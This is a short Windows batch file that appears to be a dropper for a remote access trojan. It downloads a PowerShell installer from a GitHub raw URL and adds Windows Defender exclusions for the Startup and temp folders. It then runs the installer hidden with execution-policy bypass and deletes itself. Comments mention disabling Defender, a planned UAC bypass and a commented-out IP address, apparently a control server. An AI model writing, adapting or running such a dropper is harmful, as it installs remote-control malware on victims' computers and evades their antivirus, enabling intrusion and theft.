@REM TODO: add UAC bypass dumbass

@REM change me
@REM set "EcSjRhAguo=45.61.56.252"



@REM disable defender

@REM rat resources

powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'

powershell powershell.exe -windowstyle hidden -ep bypass "./installer.ps1"

@REM self delete
del wget.cmd
